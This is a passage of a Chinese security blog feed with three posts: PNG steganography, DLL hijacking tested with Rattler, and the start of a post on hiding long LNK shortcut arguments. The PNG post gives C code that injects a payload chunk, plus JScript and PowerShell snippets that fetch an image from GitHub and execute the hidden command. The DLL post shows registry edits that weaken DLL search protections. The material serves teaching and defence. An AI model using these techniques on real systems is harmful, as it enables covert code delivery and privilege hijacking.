(3) 图像γ数据块gAMA(image gamma) (4) 图像直方图数据块hIST(image histogram) (5) 物理像素尺寸数据块pHYs(physical pixel dimensions) (6) 样本有效位数据块sBIT(significant bits) (7) 文本信息数据块tEXt(textual data) (8) 图像最后修改时间数据块tIME (image last-modification time) (9) 图像透明数据块tRNS (transparency) (10) 压缩文本数据块zTXt (compressed textual data) 0x03 实例格式分析 工具：Hex Editor 优点： 可对16进制字符串进行标记，设置颜色，方便格式分析 测试文件： 如图 源下载地址： http://www.easyicon.net/language.en/1172671-png_icon.html 标记好的文件格式如图 (1) PNG文件署名域固定格式： 89 50 4e 47 0d 0a 1a 0a (2) IHDR00000008h: 00 00 00 0D 49 48 44 52 00 00 00 1A 00 00 00 1A ; ….IHDR……..00000018h: 08 04 00 00 00 03 43 84 45 ; ……C凟 数据块结构： Length:00 00 00 0D 前4字节，定义长度，00 00 00 0D十进制为13，代表长度为13个字节 Chunk Type Code：49 48 44 52 4字节，定义数据块类型码，此处为IHDR Chunk Data：00 00 00 1A 00 00 00 1A 08 04 00 00 00 共13字节，定义数据内容 CRC：4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值 即对以下十六进制作计算：49 48 44 52 00 00 00 1A 00 00 00 1A 08 04 00 00 00 编写程序对CRC算法进行验证，保存为example1.cpp,源代码如下： #include &lt;string.h&gt; unsigned int GetCrc32(char* InStr,unsigned int len){ unsigned int Crc32Table[256]; int i,j; unsigned int Crc; for (i = 0; i &lt; 256; i++){ Crc = i; for (j = 0; j &lt; 8; j++){ if (Crc &amp; 1) Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320; else Crc &gt;&gt;= 1; } Crc32Table[i] = Crc; } Crc=0xffffffff; for(int m=0; m&lt;len; m++){ Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]]; } Crc ^= 0xFFFFFFFF; return Crc; } int main(int argc, char* argv[]) { char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00}; unsigned int crc32=GetCrc32(buf,sizeof(buf)); printf(&quot;%08X\n&quot;,crc32); return 0; } 运行后如图，输出03438445，同文件中的CRC32校验码相同 (3) gAMA00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; ….gAMA..睆.黙. 数据块结构： Length: 00 00 00 04 Chunk Type Code： 67 41 4D 41 Chunk Data： 00 00 B1 8F CRC： 0B FC 61 05 (4) cHRM00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; … cHRM..z&amp;..€?00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..€?.u0..阘00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C ; ..:?..p満Q&lt; 数据块结构： Length: 00 00 00 20 Chunk Type Code： 63 48 52 4D Chunk Data： 00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70 CRC： 9C BA 51 3C (5) IDAT(6-14) tEXt (15)IEND 数据块结构： Length: 00 00 00 00 Chunk Type Code： 49 45 4E 44 Chunk Data： CRC： AE 42 60 82 固定结构，CRC的值为对Chunk Type Code作CRC32校验 如图 0x04 编写程序分析文件格式 开发工具：vc6.0 1、读取PNG文件保存为example2.cpp，代码如下: #include&lt;stdio.h&gt; #include&lt;string.h&gt; int main(int argc, char* argv[]) { FILE *fp; if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL) return 0; fseek(fp,0,SEEK_END); int len=ftell(fp); unsigned char *buf=new unsigned char[len]; fseek(fp,0,SEEK_SET); fread(buf,len,1,fp); printf(&quot;len=%d\n&quot;,len); for(int i=1;i&lt;=len;i++) { printf(&quot;%02X &quot;,buf[i-1]); if(i%16==0) printf(&quot;\n&quot;); } fclose(fp); printf(&quot;\n&quot;); return 0; } 如图，程序按照UltraEdit的格式输出，以便后续的格式分析 2、解析数据块结构从第8字节开始，读前四字节为ChunkLength 对应的代码为： unsigned int ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; 接着四字节为ChunkName printf(&quot;ChunkName:%c%c%c%c\n&quot;,buf[0],buf[1],buf[2],buf[3]); 然后根据ChunkLength读出完整的ChunkData 最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较 保存为check.cpp,完整代码如下： #include&lt;stdio.h&gt; #include&lt;string.h&gt; unsigned int GetCrc32(unsigned char* InStr,unsigned int len){ unsigned int Crc32Table[256]; unsigned int i,j; unsigned int Crc; for (i = 0; i &lt; 256; i++){ Crc = i; for (j = 0; j &lt; 8; j++){ if (Crc &amp; 1) Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320; else Crc &gt;&gt;= 1; } Crc32Table[i] = Crc; } Crc=0xffffffff; for(unsigned int m=0; m&lt;len; m++){ Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]]; } Crc ^= 0xFFFFFFFF; return Crc; } int main(int argc, char* argv[]) { FILE *fp; unsigned char *buf=NULL; unsigned int len=0; unsigned int ChunkLen=0; unsigned int ChunkCRC32=0; unsigned int ChunkOffset=0; unsigned int crc32=0; unsigned int i=0; if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL) return 0; fseek(fp,0,SEEK_END); len=ftell(fp); buf=new unsigned char[len]; fseek(fp,0,SEEK_SET); fread(buf,len,1,fp); printf(&quot;Total Len=%d\n&quot;,len); printf(&quot;----------------------------------------------------\n&quot;); fseek(fp,8,SEEK_SET); ChunkOffset=8; i=0; while(1) { i++; memset(buf,0,len); fread(buf,4,1,fp); ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; fread(buf,4+ChunkLen,1,fp); printf(&quot;[+]ChunkName:%c%c%c%c &quot;,buf[0],buf[1],buf[2],buf[3]); if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0) printf(&quot;Palette Chunk\n&quot;); printf(&quot;Ancillary Chunk\n&quot;); printf(&quot; ChunkOffset:0x%08x \n&quot;,ChunkOffset); printf(&quot; ChunkLen: %10d \n&quot;,ChunkLen); ChunkOffset+=ChunkLen+12; crc32=GetCrc32(buf,ChunkLen+4); printf(&quot; ExpectCRC32:%08X\n&quot;,crc32); fread(buf,4,1,fp); ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; printf(&quot; ChunkCRC32: %08X &quot;,ChunkCRC32); if(crc32!=ChunkCRC32) printf(&quot;[!]CRC32Check Error!\n&quot;); else printf(&quot;Check Success!\n\n&quot;); ChunkLen=ftell(fp); if(ChunkLen==(len-12)) { printf(&quot;\n----------------------------------------------------\n&quot;); printf(&quot;Total Chunk:%d\n&quot;,i); break; } } fclose(fp); return 0; } 运行如图，可获得完整的PNG文件结构 注： 这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。 后续会补充python的实现代码 0x05 去除多余数据 上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块 1、工具实现如图，使用Hex Editor去除辅助数据块gAMA、cHRM和bKGD 如图，文件大小变化，但不影响PNG文件浏览 2、程序实现去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png 保存为compress.cpp,完整代码为： #include&lt;stdio.h&gt; #include&lt;string.h&gt; unsigned int GetCrc32(unsigned char* InStr,unsigned int len){ unsigned int Crc32Table[256]; unsigned int i,j; unsigned int Crc; for (i = 0; i &lt; 256; i++){ Crc = i; for (j = 0; j &lt; 8; j++){ if (Crc &amp; 1) Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320; else Crc &gt;&gt;= 1; } Crc32Table[i] = Crc; } Crc=0xffffffff; for(unsigned int m=0; m&lt;len; m++){ Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]]; } Crc ^= 0xFFFFFFFF; return Crc; } int main(int argc, char* argv[]) { FILE *fp,*fpnew; unsigned char *buf=NULL; unsigned int len=0; unsigned int ChunkLen=0; unsigned int ChunkCRC32=0; unsigned int ChunkOffset=0; unsigned int crc32=0; unsigned int i=0,j=0; unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a}; unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82}; if((fp=fopen(&quot;c:\\test\\0.png&quot;,&quot;rb+&quot;))==NULL) return 0; if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL) return 0; fseek(fp,0,SEEK_END); len=ftell(fp); buf=new unsigned char[len]; fseek(fp,0,SEEK_SET); fread(buf,len,1,fp); printf(&quot;Total Len=%d\n&quot;,len); printf(&quot;----------------------------------------------------\n&quot;); fseek(fp,8,SEEK_SET); ChunkOffset=8; i=0; fwrite(Signature,8,1,fpnew); while(1) { i++; j=0; memset(buf,0,len); fread(buf,4,1,fp); fwrite(buf,4,1,fpnew); ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; fread(buf,4+ChunkLen,1,fp); printf(&quot;[+]ChunkName:%c%c%c%c &quot;,buf[0],buf[1],buf[2],buf[3]); if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0) { printf(&quot;Palette Chunk\n&quot;); fwrite(buf,4+ChunkLen,1,fpnew); } else { printf(&quot;Ancillary Chunk\n&quot;); fseek(fpnew,-4,SEEK_CUR); j=1; } printf(&quot; ChunkOffset:0x%08x \n&quot;,ChunkOffset); printf(&quot; ChunkLen: %10d \n&quot;,ChunkLen); crc32=GetCrc32(buf,ChunkLen+4); printf(&quot; ExpectCRC32:%08X\n&quot;,crc32); fread(buf,4,1,fp); ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; printf(&quot; ChunkCRC32: %08X &quot;,ChunkCRC32); if(crc32!=ChunkCRC32) printf(&quot;[!]CRC32Check Error!\n&quot;); else { printf(&quot;Check Success!\n\n&quot;); if(j==0) fwrite(buf,4,1,fpnew); } ChunkLen=ftell(fp); if(ChunkLen==(len-12)) { printf(&quot;\n----------------------------------------------------\n&quot;); printf(&quot;Total Chunk:%d\n&quot;,i); break; } } fwrite(IEND,12,1,fpnew); fclose(fp); fclose(fpnew); return 0; } 如图，左边为原始PNG文件大小，右边为去掉所有辅助数据块后的文件，仍然可以正常浏览 0x06 写入Payload 实例： 按照辅助数据块的格式写入Payload 写入的Payload为: calc.exe 辅助数据块设置为： tEXt 对应的完整数据块结构如下： Length: 00 00 00 08 Chunk Type Code： 74 45 58 74 Chunk Data： 63 61 6c 63 2e 65 78 65 CRC： fa c4 08 76 写入的十六进制数据如下： 00 00 00 08 74 45 58 74 63 61 6c 63 2e 65 78 65 fa c4 08 76 注：本实例仅作演示，实际使用可换成其他数据块，更加隐蔽 1、工具实现使用Hex Editor插入数据，如图 保存后，不影响PNG文件浏览 2、程序实现去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt 保存为addpayload.cpp,完整代码： #include&lt;stdio.h&gt; #include&lt;string.h&gt; unsigned int GetCrc32(unsigned char* InStr,unsigned int len){ unsigned int Crc32Table[256]; unsigned int i,j; unsigned int Crc; for (i = 0; i &lt; 256; i++){ Crc = i; for (j = 0; j &lt; 8; j++){ if (Crc &amp; 1) Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320; else Crc &gt;&gt;= 1; } Crc32Table[i] = Crc; } Crc=0xffffffff; for(unsigned int m=0; m&lt;len; m++){ Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]]; } Crc ^= 0xFFFFFFFF; return Crc; } void convertStrToUnChar(char* str, unsigned char* UnChar) { int i = strlen(str), j = 0, counter = 0; char c[2]; unsigned int bytes[2]; for (j = 0; j &lt; i; j += 2) { if(0 == j % 2) { c[0] = str[j]; c[1] = str[j + 1]; sscanf(c, &quot;%02x&quot; , &amp;bytes[0]); UnChar[counter] = bytes[0]; counter++; } } return; } void AddPayload(FILE *fp) { char *Payload=&quot;calc.exe&quot;; unsigned char *buf; int len; int crc32; len=strlen(Payload); buf=new unsigned char[len+12]; buf[0]=len&gt;&gt;24&amp;0xff; buf[1]=len&gt;&gt;16&amp;0xff; buf[2]=len&gt;&gt;8&amp;0xff; buf[3]=len&amp;0xff; buf[4]=&#39;t&#39;; buf[5]=&#39;E&#39;; buf[6]=&#39;X&#39;; buf[7]=&#39;t&#39;; for(int j=0;j&lt;len;j++) buf[j+8]=Payload[j]; buf[len+8]=0XFA; buf[len+9]=0XC4; buf[len+10]=0X08; buf[len+11]=0X76; fwrite(buf,len+12,1,fp); } int main(int argc, char* argv[]) { FILE *fp,*fpnew; unsigned char *buf=NULL; unsigned int len=0; unsigned int ChunkLen=0; unsigned int ChunkCRC32=0; unsigned int ChunkOffset=0; unsigned int crc32=0; unsigned int i=0,j=0; unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a}; unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82}; if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL) return 0; if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL) return 0; fseek(fp,0,SEEK_END); len=ftell(fp); buf=new unsigned char[len]; fseek(fp,0,SEEK_SET); fread(buf,len,1,fp); printf(&quot;Total Len=%d\n&quot;,len); printf(&quot;----------------------------------------------------\n&quot;); fseek(fp,8,SEEK_SET); ChunkOffset=8; i=0; fwrite(Signature,8,1,fpnew); while(1) { i++; j=0; memset(buf,0,len); fread(buf,4,1,fp); fwrite(buf,4,1,fpnew); ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; fread(buf,4+ChunkLen,1,fp); printf(&quot;[+]ChunkName:%c%c%c%c &quot;,buf[0],buf[1],buf[2],buf[3]); if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0) { printf(&quot;Palette Chunk\n&quot;); fwrite(buf,4+ChunkLen,1,fpnew); } else { printf(&quot;Ancillary Chunk\n&quot;); fseek(fpnew,-4,SEEK_CUR); j=1; } printf(&quot; ChunkOffset:0x%08x \n&quot;,ChunkOffset); printf(&quot; ChunkLen: %10d \n&quot;,ChunkLen); crc32=GetCrc32(buf,ChunkLen+4); printf(&quot; ExpectCRC32:%08X\n&quot;,crc32); fread(buf,4,1,fp); ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3]; printf(&quot; ChunkCRC32: %08X &quot;,ChunkCRC32); if(crc32!=ChunkCRC32) printf(&quot;[!]CRC32Check Error!\n&quot;); else { printf(&quot;Check Success!\n\n&quot;); if(j==0) fwrite(buf,4,1,fpnew); } ChunkLen=ftell(fp); if(ChunkLen==(len-12)) { printf(&quot;\n----------------------------------------------------\n&quot;); printf(&quot;Total Chunk:%d\n&quot;,i); break; } } AddPayload(fpnew); fwrite(IEND,12,1,fpnew); fclose(fp); fclose(fpnew); return 0; } 使用check.cpp对其进行校验，如图，校验成功 0x07 读取payload并执行 将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行： 1、javascripth = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;); h.SetTimeouts(0, 0, 0, 0); h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&quot;,false); h.Send(); Data = h.ResponseText; x=Data.indexOf(&quot;tEXt&quot;); y=Data.indexOf(&quot;IEND&quot;); str=Data.substring(x+4,y-8); new ActiveXObject(&quot;WScript.Shell&quot;).Run(str); 2、powershell$url = &#39;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&#39; $request = New-Object System.Net.WebCLient $bytes = $request.DownloadString($url) $x=$bytes.indexof(&quot;tEXt&quot;) $y=$bytes.indexof(&quot;IEND&quot;) $str=$bytes.Substring($x+4,$y-$x-12) Start-Process -FilePath $str 注: 这里给出两种方法，仅作演示 0x08 小结 本文详细介绍分析了PNG文件的格式，编写程序实现以下功能： 自动解析PNG文件格式，辅助查找其中的隐藏内容 添加Payload 下载PNG图片解析并执行payload LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[DLL劫持漏洞自动化识别工具Rattler测试]]></title>
    <url>%2Fposts%2Fa942458e.html</url>
    <content type="text"><![CDATA[0x00 前言 最近，来自SensePost的Chris Le Roy开源了一款工具：Rattler，可用来自动识别DLL是否存在预加载漏洞(也可以理解为DLL劫持漏洞，文中该名词均采用DLL劫持漏洞)。虽然DLL劫持漏洞已不再是新技术，可追溯到2010年，但是我对自动化很是感兴趣，于是对此做了进一步研究。 本文将理清DLL劫持漏洞原理，实例分析，测试自动化工具Rattler，分享心得，并测试一个存在该漏洞的软件——Explorer Suite安装包 注： Explorer Suite安装包内包含CFF Explorer，免费，常用来编辑PE文件格式，最后更新于2012年11月18日，是比较小众的一款工具。 对于分析PE文件格式，建议使用作者另一款更专业的工具：Cerbero Profiler Chris Le Roy介绍Rattler的博客地址： https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/ Chris Le Roy在BSides Cape Town上也介绍了Rattler，简介如下： http://www.bsidescapetown.co.za/speaker/chris-le-roy/ 0x01 简介 DLL劫持漏洞根源程序在调用DLL时未指明DLL的完整路径 SafeDllSearchMode从WindowsXPSP2开始，SafeDllSearchMode默认开启，SafeDllSearchMode的存在是为了阻止在XP时代存在的DLL劫持漏洞 注： 强制关闭SafeDllSearchMode的方法： 创建注册表项 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode 值设为0 程序在调用DLL时，如果未指明DLL的完整路径，那么系统会按照一套固定的搜索顺序寻找DLL 如果SafeDllSearchMode开启，程序会依次从以下位置查找DLL文件： The directory from which the application loaded The system directory The 16-bit system directory The Windows directory The current directory The directories that are listed in the PATH environment variable 如果关闭，则从以下位置查找DLL文件： The directory from which the application loaded The current directory The system directory The 16-bit system directory The Windows directory The directories that are listed in the PATH environment variable 详细内容见： https://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx KnownDLLs注册表位置： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs KnownDLLs注册表项下包含一系列常见的系统dll，如usp10.dll、lpk.dll、shell32.dll、user32.dll 注： 如果创建注册表项 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\ExcludeFromKnownDlls 并指定具体dll名称，可以使KnownDLLs列表中同名的dll保护失效 修改后需要重启才能生效 SafeDllSearchMode+KnownDLLs二者结合可用来防范对系统dll的劫持 注： 系统dll是指排除ExcludeFromKnownDlls项后，KnownDLLs注册表项下包含的dll列表 如果调用的dll“不常见”，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞： 在程序同级目录下预先放置一个同名的dll，在进程启动的过程中会优先加载，实现劫持 注： 这里提到的DLL劫持漏洞微软尚未给出直接的修复方法，个人认为原因有以下几点： 1. 这是开发者的失误，换用绝对路径就能避免这个问题 2. 利用的前提是攻击者已经能够在同级目录放置文件，这代表系统已经被攻破 3. 如果直接修复，或许会影响老版本程序，兼容性不好 注： 该文章对理清上述顺序起到很大帮助： http://www.freebuf.com/articles/78807.html 0x02 利用实例 接下来编写一个存在DLL劫持漏洞的实例，演示如何利用 测试dll： 使用dll模板，具体代码略，加载成功后弹出计算器 测试程序的c++代码如下： #include &quot;stdafx.h&quot; #include &lt;windows.h&gt; int main() { HMODULE hDllLib = LoadLibrary(_T(&quot;Kernel32.dll&quot;)); if (hDllLib) { FARPROC fpFun = GetProcAddress(hDllLib, &quot;GetVersion&quot;); DWORD dwVersion = (*fpFun)(); DWORD dwWindowsMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion))); DWORD dwWindowsMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion))); printf(&quot;version:%d,%d \n&quot;, dwWindowsMajorVersion, dwWindowsMinorVersion); FreeLibrary(hDllLib); } HMODULE hDllLib2 = LoadLibrary(_T(&quot;CRYPTSP.dll&quot;)); FreeLibrary(hDllLib2); return 0; } 程序通过LoadLibrary分别调用Kernel32.dll和CRYPTSP.dll 实际测试： 将测试dll重命名为Kernel32.dll，并放于程序同级目录下，运行如图 由于Kernel32.dll出现在KnownDLLs的列表中，所以在程序同级目录下的Kernel32.dll并不会被加载 然后将测试dll重命名为CRYPTSP.dll，并放于程序同级目录下，运行如图 由于CRYPTSP.dll并未在KnownDLLs的列表中，所以在程序同级目录下的CRYPTSP.dll被加载，成功弹出计算器 0x03 实际利用 本节通过实例介绍如何使用Process Monitor查找程序中存在的DLL劫持漏洞，测试实例为Chris Le Roy在介绍Rattler的博客中提到过的NDP461-KB3102438-Web.exe 博客地址如下： https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/ NDP461-KB3102438-Web.exe的下载地址： http://www.microsoft.com/zh-cn/download/details.aspx?id=49981&amp;134b2bb0-86c1-fe9f-d523-281faef41695=1&amp;fa43d42b-25b5-4a42-fe9b-1634f450f5ee=True 使用Process Monitor做如下设置： Include the following filters: Operation is CreateFile Operation is LoadImage Path contains .cpl Path contains .dll Path contains .drv Path contains .exe Path contains .ocx Path contains .scr Path contains .sys Exclude the following filters: Process Name is procmon.exe Process Name is Procmon64.exe Process Name is System Operation begins with IRP_MJ_ Operation begins with FASTIO_ Result is SUCCESS Path ends with pagefile.sys 参考地址： https://msdn.microsoft.com/library/ff919712 注： 设置Exclude Result is SUCCESS后会只显示NAME NOT FOUND项，也就是只查看未成功加载的dll项，即KnownDLLs的列表中不包含的dll名称，可用于查找存在漏洞的dll路径 如图 启动NDP461-KB3102438-Web.exe后，查看Process Monitor，如图 可以看到NDP461-KB3102438-Web.exe在启动的过程中会加载CRYPTSP.dll，同时显示NAME NOT FOUND，表示无法找到该文件，加载失败 现在将测试dll重命名为CRYPTSP.dll，并放于NDP461-KB3102438-Web.exe的同级目录下 打开Process Monitor，设置Filter，去掉Exclude Result is SUCCESS项，再次启动NDP461-KB3102438-Web.exe并记录 如下图，显示C:\test\CRYPTSP.dll已被成功加载，Result为Success，DLL劫持成功 如下图，程序在执行过程中成功弹出计算器 0x04 程序自动化实现 通过Process Monitor查看DLL劫持漏洞是比较直接的方法，但是对于较大的程序，加载的DLL数目很多，手动查找很不现实，费事费力，所以如果能够通过程序实现上述过程，自动查找并利用，就可以大大提高效率，这就是Rattler所解决的问题 项目地址： https://github.com/sensepost/rattler 思路： 枚举进程调用的dll列表，解析出dll的名称 将测试dll分别重命名为列表中的dll名称 再次启动程序，检测是否成功创建进程calc.exe,如果成功，代表存在漏洞，否则不存在 实际测试： 使用Visual Studio编译Rattler 将payload.dll放于同级目录下 payload.dll下载地址： https://github.com/sensepost/rattler/releases/download/v1.0/payload.dll 管理员权限的cmd下运行命令： Rattler.exe NDP461-KB3102438-Web.exe 1 注： 因为NDP461-KB3102438-Web.exe需要管理员权限运行，所以cmd也需要管理员权限 如下图，自动找到存在预加载漏洞的dll列表 注： 在反复启动进程的过程中，calc.exe没有正常被关闭，所以得出的结果要多于实际结果 补充： 下载的NDP461-KB3102438-Web.exe通常位于Downloads文件夹下，所以只要在该目录预先放置CRYPTSP.dll，那么在用户下载运行NDP461-KB3102438-Web.exe的过程中，就能够实现加载CRYPTSP.dll 同时，安装NDP461-KB3102438-Web.exe需要管理员权限，那么此时CRYPTSP.dll也获得了管理员权限 0x05 验证测试 掌握该方法后，测试其他程序，例如CFF Explorer的安装包Explorer Suite 下载地址：http://www.ntcore.com/exsuite.php 同样借助Process Monitor查看CFF Explorer的安装包ExplorerSuite.exe在启动过程中的操作 如图，找到ExplorerSuite.exe在启动过程中加载的dll列表 经实际测试，将payload.dll重命名为apphelp.dll或者dwmapi.dll均能够触发payload，弹出计算器 自动化程序测试： 如图，得出存在劫持漏洞的dll列表 注： 在反复启动进程的过程中，calc.exe正常被关闭，所以得出的结果准确 0x06 防御 1、开发者需要注意的问题： 调用第三方DLL时，使用LoadLibrary API加载DLL时使用绝对路径，类似的情况还包括其他API如LoadLibraryEx, CreateProcess, ShellExecute等，将所有需要使用到的DLL放在应用程序所在的目录，不放到系统目录或者其他目录 调用系统DLL时，使用绝对路径 程序启动时调用API SetDllDirectory(L””)将当前目录从DLL加载顺序中移除 补充： 从Windows 7的KB2533623补丁开始，微软更新了三个解决DLL劫持问题的新API：SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题 但是这些API只能在打了KB2533623补丁的Windows7和Server2008上使用 详情见： https://support.microsoft.com/zh-cn/kb/2533623 2、用户需要注意的问题： 留意浏览器下载目录下是否有可疑dll，防止其劫持下载的安装程序 对于“不可信”的程序，建议使用Process Monitor或者Rattler检查是否存在DLL劫持漏洞 0x07 小结 我在对DLL劫持漏洞原理的研究过程中，走了一小段弯路，某些资料提到 如果进程尝试加载的DLL并不存在，那么进程仍然会尝试去当前目录加载这个DLL，这是SafeDllSearchMode所无法防范的。 这让我产生了如下疑问： 这里提到的“并不存在的DLL”究竟是指哪些dll?系统不存在的dll?但CRYPTSP.dll却是系统默认的包含的dll “SafeDllSearchMode所无法防范的”DLL劫持到底是指什么?难道DLL劫持还有多种?有几种? 好在最终解决了这些问题，希望本文也能帮助有同样疑惑的人 利用DLL劫持漏洞自动化识别工具Rattler对常用工具进行测试，能很快找出存在的漏洞位置，高效，方便，值得测试使用 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——快捷方式文件的参数隐藏技巧]]></title>
    <url>%2Fposts%2F6dfb79c5.html</url>
    <content type="text"><![CDATA[0x00 前言 最近，phrozensoft在博客中介绍了关于快捷方式的利用技巧，实现了将应用程序存储在快捷方式当中，当用户打开快捷方式时，通过vbs脚本释放应用程序并运行。 我对此很感兴趣，因为快捷方式的参数默认存在长度限制，最大为260，并且我在研究jsrat的过程也遇到过这个问题(最后通过调用sct文件解决了长度限制问题) phrozensoft分享了Delphi格式的POC代码，本文将要对其进行测试，研究lnk的文件格式，开发出对应powershell实现的POC代码，简单分析该技术的利用和防御方法 phrozensoft博客地址： https://www.phrozensoft.com/2016/12/shortcuts-as-entry-points-for-malware-poc-part-2-19 0x01 简介 Delphi是Windows平台下著名的快速应用程序开发工具 Borland公司研发 也可以在LINUX平台上开发应用，其在LINUX上的对应产品Kylix 常用版本： Borland Delphi 7 Delphi 2010 0x02 Delphi POC测试 phrozensoft博客中也分享了其他功能的poc，如生成lnk文件的python脚本，本文暂不介绍，只测试其中的Delphi POC 环境搭建： 测试系统：Win7 x86 Delphi版本：Delphi 2010 注: 使用Delphi 7会存在编译不通过的错误，提示“File not found System.sysutils.dcu”换用Delphi 2010后，poc作细微修改编译通过 1.新建工程打开Delphi 2010 选择File-New-Other-Console Application 直接复制poc代码，提示错误，如图 2.修改poc经测试，System.SysUtils需要更改为SysUtils 编译通过，如图 3.编译选择Project-Build All Projects 如图，编译成功，生成Project1.exe 4.测试新建test.txt,填入超过260个字符的数据： echo 123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678 cmd下执行如下命令： Project1.exe test.txt test.lnk 生成test.lnk 查看命令行参数，只能看到长度为260的字符串，如图 然而，lnk文件的大小为2.45kb，如图 (看起来我们发现了有趣的地方) cmd下打开test.lnk，lnk文件的参数正常执行，显示的字符超过超过260个，没有被截断，如图 使用16进制编辑器Hex Editor查看lnk文件格式，如图 注: 无法使用UltraEdit，UltraEdit打开lnk文件默认会打开lnk指向的文件实例如图，指向cmd.exe 0x03 Lnk文件格式介绍 1、整体结构 文件头 Shell Item Id List段 文件位置信息段 描述字符段 相对路径段 工作目录段 命令行段 图标文件段 附加信息段 2、文件头结构1. 偏移 长度 说明 0h 4字节 固定值，字符为L 如图 2. 偏移 长度 说明 4h 4字节 GUID 如图 3. 偏移 长度 说明 14h 4字节 属性标志位 将该四字节以二进制表示，如果0-6位为1，分别代表该lnk文件包含以下属性： 0位 有shell item id list1位 指向文件或文件夹2位 存在描述字符串3位 